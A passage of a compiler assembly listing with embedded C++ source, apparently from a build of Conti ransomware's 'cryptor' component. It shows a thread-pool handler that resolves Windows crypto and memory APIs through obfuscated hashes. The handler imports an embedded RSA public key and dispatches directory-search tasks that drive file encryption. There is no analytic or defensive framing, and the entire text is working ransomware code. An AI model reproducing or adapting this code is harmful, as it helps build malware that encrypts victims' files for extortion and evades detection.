; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00621	0f b6 4c 1d f1	 movzx	 ecx, BYTE PTR $T4[rbp+rbx-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00626	b8 77 00 00 00	 mov	 eax, 119		; 00000077H
  0062b	2b c1		 sub	 eax, ecx
  0062d	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00630	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00635	f7 e9		 imul	 ecx
  00637	03 d1		 add	 edx, ecx
  00639	c1 fa 06	 sar	 edx, 6
  0063c	8b c2		 mov	 eax, edx
  0063e	c1 e8 1f	 shr	 eax, 31
  00641	03 d0		 add	 edx, eax
  00643	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00646	2b c8		 sub	 ecx, eax
  00648	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0064d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00650	f7 e9		 imul	 ecx
  00652	03 d1		 add	 edx, ecx
  00654	c1 fa 06	 sar	 edx, 6
  00657	8b c2		 mov	 eax, edx
  00659	c1 e8 1f	 shr	 eax, 31
  0065c	03 d0		 add	 edx, eax
  0065e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00661	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00663	88 4c 1d f1	 mov	 BYTE PTR $T4[rbp+rbx-255], cl
  00667	48 ff c3	 inc	 rbx
  0066a	48 83 fb 42	 cmp	 rbx, 66			; 00000042H
  0066e	72 b1		 jb	 SHORT $LL539@GetCryptoP
$LN538@GetCryptoP:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 650  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xad18087f, 52);//GetProcAddress(hAdvapi32, OBFA("CryptAcquireContextA"));

  00670	ba 10 00 00 00	 mov	 edx, 16
  00675	41 b8 7f 08 18
	ad		 mov	 r8d, -1390933889	; ad18087fH
  0067b	44 8d 4a 24	 lea	 r9d, QWORD PTR [rdx+36]
  0067f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 651  : 	return pFunction(phProv, szContainer, szProvider, dwProvType, dwFlags);

  00684	41 b9 18 00 00
	00		 mov	 r9d, 24
  0068a	c7 44 24 20 08
	00 00 f0	 mov	 DWORD PTR [rsp+32], -268435448 ; f0000008H
  00692	4c 8d 45 f1	 lea	 r8, QWORD PTR $T4[rbp-255]
  00696	33 d2		 xor	 edx, edx
  00698	48 8b cf	 mov	 rcx, rdi
  0069b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 53   : 	return bSuccess;

  0069d	eb 05		 jmp	 SHORT $LN1@GetCryptoP
$LN566@GetCryptoP:

; 49   : 		return TRUE;

  0069f	b8 01 00 00 00	 mov	 eax, 1
$LN1@GetCryptoP:

; 54   : }

  006a4	4c 8d 9c 24 40
	01 00 00	 lea	 r11, QWORD PTR [rsp+320]
  006ac	49 8b 5b 10	 mov	 rbx, QWORD PTR [r11+16]
  006b0	49 8b 7b 18	 mov	 rdi, QWORD PTR [r11+24]
  006b4	49 8b e3	 mov	 rsp, r11
  006b7	5d		 pop	 rbp
  006b8	c3		 ret	 0
?GetCryptoProvider@@YAHPEA_K@Z ENDP			; GetCryptoProvider
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z
_TEXT	SEGMENT
$T1 = 48
CryptoProvider$ = 80
RsaPublicKey$ = 88
__$ArrayPad$ = 96
ThreadPoolInfo$ = 128
?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z PROC	; ThreadpoolHandler, COMDAT

; 60   : {

$LN1345:
  00000	48 89 5c 24 10	 mov	 QWORD PTR [rsp+16], rbx
  00005	48 89 6c 24 18	 mov	 QWORD PTR [rsp+24], rbp
  0000a	48 89 74 24 20	 mov	 QWORD PTR [rsp+32], rsi
  0000f	57		 push	 rdi
  00010	48 83 ec 70	 sub	 rsp, 112		; 00000070H
  00014	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001b	48 33 c4	 xor	 rax, rsp
  0001e	48 89 44 24 60	 mov	 QWORD PTR __$ArrayPad$[rsp], rax
  00023	48 8b f9	 mov	 rdi, rcx

; 61   : 	HCRYPTKEY RsaPublicKey;
; 62   : 	HCRYPTPROV CryptoProvider;
; 63   : 
; 64   : 	if (!GetCryptoProvider(&CryptoProvider)) {

  00026	48 8d 4c 24 50	 lea	 rcx, QWORD PTR CryptoProvider$[rsp]
  0002b	e8 00 00 00 00	 call	 ?GetCryptoProvider@@YAHPEA_K@Z ; GetCryptoProvider
  00030	85 c0		 test	 eax, eax
  00032	75 19		 jne	 SHORT $LN7@Threadpool
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  00034	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  00037	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  0003d	44 8d 48 47	 lea	 r9d, QWORD PTR [rax+71]
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 446  : 	return pFunction(dwExitCode);

  00046	b9 01 00 00 00	 mov	 ecx, 1
  0004b	ff d0		 call	 rax
$LN7@Threadpool:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 68   : 	if (!pCryptImportKey(CryptoProvider, g_PublicKey, sizeof(g_PublicKey), 0, 0, &RsaPublicKey)) {

  0004d	48 8b 5c 24 50	 mov	 rbx, QWORD PTR CryptoProvider$[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 611  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0x70d2c0e4, 55);//GetProcAddress(hAdvapi32, OBFA("CryptImportKey"));

  00052	ba 10 00 00 00	 mov	 edx, 16
  00057	41 b8 e4 c0 d2
	70		 mov	 r8d, 1892860132		; 70d2c0e4H
  0005d	44 8d 4a 27	 lea	 r9d, QWORD PTR [rdx+39]
  00061	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 612  : 	return pFunction(hProv, pbData, dwDataLen, hPubKey, dwFlags, phKey);

  00066	48 8d 4c 24 58	 lea	 rcx, QWORD PTR RsaPublicKey$[rsp]
  0006b	45 33 c9	 xor	 r9d, r9d
  0006e	48 89 4c 24 28	 mov	 QWORD PTR [rsp+40], rcx
  00073	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?g_PublicKey@@3PAEA ; g_PublicKey
  0007a	48 8b cb	 mov	 rcx, rbx
  0007d	c7 44 24 20 00
	00 00 00	 mov	 DWORD PTR [rsp+32], 0
  00085	41 b8 00 10 00
	00		 mov	 r8d, 4096		; 00001000H
  0008b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 68   : 	if (!pCryptImportKey(CryptoProvider, g_PublicKey, sizeof(g_PublicKey), 0, 0, &RsaPublicKey)) {

  0008d	85 c0		 test	 eax, eax
  0008f	75 19		 jne	 SHORT $LN8@Threadpool
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  00091	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  00094	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  0009a	44 8d 48 47	 lea	 r9d, QWORD PTR [rax+71]
  0009e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 446  : 	return pFunction(dwExitCode);

  000a3	b9 01 00 00 00	 mov	 ecx, 1
  000a8	ff d0		 call	 rax
$LN8@Threadpool:

; 565  : 	pFunction = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1aab6455, 59);//GetProcAddress(hKernel32, OBFA("VirtualAlloc"));

  000aa	ba 0f 00 00 00	 mov	 edx, 15
  000af	41 b8 55 64 ab
	1a		 mov	 r8d, 447439957		; 1aab6455H
  000b5	44 8d 4a 2c	 lea	 r9d, QWORD PTR [rdx+44]
  000b9	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 566  : 	return pFunction(lpAddress, dwSize, flAllocationType, flProtect);

  000be	33 c9		 xor	 ecx, ecx
  000c0	ba 00 00 50 00	 mov	 edx, 5242880		; 00500000H
  000c5	41 b8 00 30 00
	00		 mov	 r8d, 12288		; 00003000H
  000cb	44 8d 49 04	 lea	 r9d, QWORD PTR [rcx+4]
  000cf	ff d0		 call	 rax
  000d1	48 8b e8	 mov	 rbp, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 73   : 	if (!Buffer) {

  000d4	48 85 c0	 test	 rax, rax
  000d7	75 17		 jne	 SHORT $LL2@Threadpool
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  000d9	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  000dc	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  000e2	44 8d 48 47	 lea	 r9d, QWORD PTR [rax+71]
  000e6	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 446  : 	return pFunction(dwExitCode);

  000eb	8d 4d 01	 lea	 ecx, QWORD PTR [rbp+1]
$LN1342@Threadpool:

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  000ee	ff d0		 call	 rax
$LL2@Threadpool:
  000f0	ba 0f 00 00 00	 mov	 edx, 15
  000f5	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
  000fb	44 8d 4a 3d	 lea	 r9d, QWORD PTR [rdx+61]
  000ff	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  00104	48 8d 4f 18	 lea	 rcx, QWORD PTR [rdi+24]
  00108	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 82   : 		PTASK_INFO TaskInfo = TAILQ_FIRST(&ThreadPoolInfo->TaskList);

  0010a	48 8b 5f 40	 mov	 rbx, QWORD PTR [rdi+64]

; 83   : 		if (!TaskInfo) {

  0010e	48 85 db	 test	 rbx, rbx
  00111	75 31		 jne	 SHORT $LN6@Threadpool
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00113	8d 53 0f	 lea	 edx, QWORD PTR [rbx+15]
  00116	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  0011c	44 8d 4b 4a	 lea	 r9d, QWORD PTR [rbx+74]
  00120	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  00125	48 8d 4f 18	 lea	 rcx, QWORD PTR [rdi+24]
  00129	ff d0		 call	 rax

; 467  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb09422e9, 69);//GetProcAddress(hKernel32, OBFA("Sleep"));

  0012b	8d 53 0f	 lea	 edx, QWORD PTR [rbx+15]
  0012e	41 b8 e9 22 94
	b0		 mov	 r8d, -1332469015	; b09422e9H
  00134	44 8d 4b 45	 lea	 r9d, QWORD PTR [rbx+69]
  00138	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 468  : 	return pFunction(dwMilliseconds);

  0013d	b9 88 13 00 00	 mov	 ecx, 5000		; 00001388H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 87   : 			continue;

  00142	eb aa		 jmp	 SHORT $LN1342@Threadpool
$LN6@Threadpool:

; 91   : 		TAILQ_REMOVE(&ThreadPoolInfo->TaskList, TaskInfo, Entries);

  00144	48 8b 4b 28	 mov	 rcx, QWORD PTR [rbx+40]
  00148	48 8b 43 30	 mov	 rax, QWORD PTR [rbx+48]
  0014c	48 85 c9	 test	 rcx, rcx
  0014f	74 06		 je	 SHORT $LN11@Threadpool
  00151	48 89 41 30	 mov	 QWORD PTR [rcx+48], rax
  00155	eb 04		 jmp	 SHORT $LN12@Threadpool
$LN11@Threadpool:
  00157	48 89 47 48	 mov	 QWORD PTR [rdi+72], rax
$LN12@Threadpool:
  0015b	48 8b 4b 30	 mov	 rcx, QWORD PTR [rbx+48]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  0015f	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 91   : 		TAILQ_REMOVE(&ThreadPoolInfo->TaskList, TaskInfo, Entries);

  00164	48 8b 43 28	 mov	 rax, QWORD PTR [rbx+40]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00168	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  0016e	44 8d 4a 3b	 lea	 r9d, QWORD PTR [rdx+59]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 91   : 		TAILQ_REMOVE(&ThreadPoolInfo->TaskList, TaskInfo, Entries);

  00172	48 89 01	 mov	 QWORD PTR [rcx], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00175	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  0017a	48 8d 4f 18	 lea	 rcx, QWORD PTR [rdi+24]
  0017e	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 95   : 		if (TaskInfo->Stop) {

  00180	83 7b 20 00	 cmp	 DWORD PTR [rbx+32], 0
  00184	75 2f		 jne	 SHORT $LN1331@Threadpool

; 96   : 			break;
; 97   : 		}
; 98   : 
; 99   : 		filesystem::SearchFiles(TaskInfo->Path, CryptoProvider, RsaPublicKey, Buffer);

  00186	48 8b d3	 mov	 rdx, rbx
  00189	48 8d 4c 24 30	 lea	 rcx, QWORD PTR $T1[rsp]
  0018e	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00193	4c 8b 44 24 58	 mov	 r8, QWORD PTR RsaPublicKey$[rsp]
  00198	48 8b c8	 mov	 rcx, rax
  0019b	48 8b 54 24 50	 mov	 rdx, QWORD PTR CryptoProvider$[rsp]
  001a0	4c 8b cd	 mov	 r9, rbp
  001a3	e8 00 00 00 00	 call	 ?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z ; filesystem::SearchFiles

; 100  : 		free(TaskInfo);

  001a8	48 8b cb	 mov	 rcx, rbx
  001ab	e8 00 00 00 00	 call	 free

; 101  : 
; 102  : 	}

  001b0	e9 3b ff ff ff	 jmp	 $LL2@Threadpool
$LN1331@Threadpool:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  001b5	ba 0f 00 00 00	 mov	 edx, 15
  001ba	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  001c0	44 8d 4a 38	 lea	 r9d, QWORD PTR [rdx+56]
  001c4	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 446  : 	return pFunction(dwExitCode);

  001c9	33 c9		 xor	 ecx, ecx
  001cb	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 105  : 	return EXIT_SUCCESS;

  001cd	33 c0		 xor	 eax, eax

; 106  : }

  001cf	48 8b 4c 24 60	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  001d4	48 33 cc	 xor	 rcx, rsp
  001d7	e8 00 00 00 00	 call	 __security_check_cookie
  001dc	4c 8d 5c 24 70	 lea	 r11, QWORD PTR [rsp+112]
  001e1	49 8b 5b 18	 mov	 rbx, QWORD PTR [r11+24]
  001e5	49 8b 6b 20	 mov	 rbp, QWORD PTR [r11+32]
  001e9	49 8b 73 28	 mov	 rsi, QWORD PTR [r11+40]
  001ed	49 8b e3	 mov	 rsp, r11
  001f0	5f		 pop	 rdi
  001f1	c3		 ret	 0
?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z ENDP	; ThreadpoolHandler
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0task_info_@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0task_info_@@QEAA@XZ PROC				; task_info_::task_info_, COMDAT

; 2648 :         _My_data._Mysize = 0;

  00000	33 c0		 xor	 eax, eax
  00002	0f 57 c0	 xorps	 xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00005	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2648 :         _My_data._Mysize = 0;

  00008	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  0000c	48 c7 41 18 07
	00 00 00	 mov	 QWORD PTR [rcx+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00014	66 89 01	 mov	 WORD PTR [rcx], ax
  00017	48 8b c1	 mov	 rax, rcx
  0001a	c3		 ret	 0
??0task_info_@@QEAA@XZ ENDP				; task_info_::task_info_
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?PutFinalTask@threadpool@@YAHH@Z
_TEXT	SEGMENT
ThreadPoolID$ = 48
?PutFinalTask@threadpool@@YAHH@Z PROC			; threadpool::PutFinalTask, COMDAT

; 207  : {

$LN33:
  00000	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 208  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;
; 209  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  0000a	85 c9		 test	 ecx, ecx
  0000c	75 10		 jne	 SHORT $LN5@PutFinalTa

; 210  : 		ThreadPoolInfo = &g_LocalThreadPool;

  0000e	48 8d 35 18 00
	00 00		 lea	 rsi, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+24
  00015	48 8d 3d 48 00
	00 00		 lea	 rdi, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A+72

; 211  : 	}

  0001c	eb 17		 jmp	 SHORT $LN8@PutFinalTa
$LN5@PutFinalTa:

; 212  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  0001e	83 f9 01	 cmp	 ecx, 1
  00021	0f 85 a1 00 00
	00		 jne	 $LN7@PutFinalTa

; 213  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  00027	48 8d 35 18 00
	00 00		 lea	 rsi, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+24
  0002e	48 8d 3d 48 00
	00 00		 lea	 rdi, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+72
$LN8@PutFinalTa:

; 219  : 	PTASK_INFO Task = new TASK_INFO;

  00035	48 89 5c 24 30	 mov	 QWORD PTR [rsp+48], rbx
  0003a	b9 38 00 00 00	 mov	 ecx, 56			; 00000038H
  0003f	48 89 6c 24 38	 mov	 QWORD PTR [rsp+56], rbp
  00044	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2648 :         _My_data._Mysize = 0;

  00049	33 ed		 xor	 ebp, ebp
  0004b	0f 57 c0	 xorps	 xmm0, xmm0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  0004e	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 219  : 	PTASK_INFO Task = new TASK_INFO;

  00054	48 8b d8	 mov	 rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00057	0f 11 00	 movups	 XMMWORD PTR [rax], xmm0

; 2648 :         _My_data._Mysize = 0;

  0005a	48 89 68 10	 mov	 QWORD PTR [rax+16], rbp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  0005e	8d 55 0f	 lea	 edx, QWORD PTR [rbp+15]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00061	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  00069	44 8d 4d 4c	 lea	 r9d, QWORD PTR [rbp+76]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0006d	66 89 28	 mov	 WORD PTR [rax], bp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 227  : 	Task->Stop = TRUE;

  00070	c7 40 20 01 00
	00 00		 mov	 DWORD PTR [rax+32], 1
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  00077	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  0007c	48 8b ce	 mov	 rcx, rsi
  0007f	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  00081	48 89 6b 28	 mov	 QWORD PTR [rbx+40], rbp
  00085	4c 8d 4b 28	 lea	 r9, QWORD PTR [rbx+40]
  00089	4c 8b 07	 mov	 r8, QWORD PTR [rdi]
